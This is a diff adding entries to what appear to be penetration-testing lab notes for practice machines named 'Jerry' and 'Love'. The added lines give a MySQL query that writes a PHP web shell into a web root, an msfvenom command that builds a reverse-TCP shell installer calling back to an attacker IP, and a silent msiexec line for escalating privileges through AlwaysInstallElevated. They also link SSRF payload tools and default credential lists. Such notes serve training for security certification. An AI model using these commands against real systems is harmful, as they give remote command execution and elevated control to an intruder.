@@ -340,3 +340,23 @@ Used in ```Jerry```
 ```
 https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 ```
+
+Used in ```Love```
+
+SSRF payload
+
+https://github.com/tarunkant/Gopherus
+
+```mysql
+select '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\omrs\\admin\\test.php';
+```
+
+[AlwaysInstallElevated](https://github.com/tedchen0001/OSCP-Notes/tree/master/Windows/Privilege)
+
+```shell
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
+```
+
+```powershell
+msiexec /quiet /qn /i <payload>
+```
